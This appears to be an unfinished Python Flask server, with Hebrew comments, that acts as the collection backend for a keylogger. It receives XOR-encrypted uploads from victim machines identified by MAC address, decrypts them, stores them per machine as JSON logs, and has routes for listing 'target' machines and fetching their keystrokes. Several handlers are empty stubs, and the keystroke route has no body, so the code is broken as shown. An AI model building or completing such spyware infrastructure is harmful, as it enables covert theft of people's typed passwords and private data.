from flask import Flask,jsonify,request
from encryptor import Encryptor
import json
import os
import time

class App:

    def __init__(self):
        self.path = "data\\"
        self.counter = 0
        self.manager = {}

    def add_computer(self,computer_name):
        pass

    def get_data(self):
        pass

    def get_computer_list(self):
        pass


app = Flask(__name__)

@app.route('/')
def home():
    pass

@app.route("/api/upload",methods=['POST'])
def upload():

    data = request.get_json()
    # process = SpecialKeys()
    decryptor = Encryptor()

    #ניהול שגיאות
    if error_manager(data):
        return jsonify({"error" : "error","message" : data})

    #קבלת הנתונים המתאימים
    folder_name = data["mac_name"].replace(":","_")
    new_data = data["data"]

    #הוספת הכתבות למחלקה
    manager.add_computer(folder_name)


    #להחזיר את ההצפנה לנתונים המקוריים
    data["data"] = decryptor.decrypt_xor(new_data)

    #לעשות על הנתונים פרוסס


    #יצירת תיקיה למחשב הנתון
    folder_path = "data\\" + folder_name
    open_new_folder(folder_path)

    #יצירת נתיב ליצירת קובץ
    file_path = folder_path + '\\' + generate_json_file()

    #שליחת הנתונים הרלוונטים לקובץ
    save_data_in_DB(data,file_path)
    return jsonify({"message" : "done", "data" : data})


def error_manager(data:dict) -> bool:
    if not data:
        return True
    return False


def open_new_folder(folder_name):
    if not os.path.exists(folder_name):
        os.mkdir(folder_name)

def generate_json_file():
    return "log_" + time.strftime("%Y-%m-%d_%H_%M_%S") + ".json"

def save_data_in_DB(data,file_path):
    with open(file_path,'w',encoding="utf-8") as file:
        json.dump(data,file,indent=4,ensure_ascii=False)


@app.route("/api/get_machine_list",methods=["GET"])
def get_target_machine_list():
    manager.get_computer_list()

@app.route("/get_keystrokes",methods=["GET"])
def get_data_from_DB():
    computer_name = request.args.get("computer")
    #בדיקה האם שלח פרמטר מחשב

    #בדיקה האם קיים כזה מחשב

    #שליחת המידע הרלוונטי


@app.route("/api/data",methods=['GET'])
def get_data():
    pass

if __name__ == '__main__':
    manager = App()
    app.run(debug=True,port=5000)

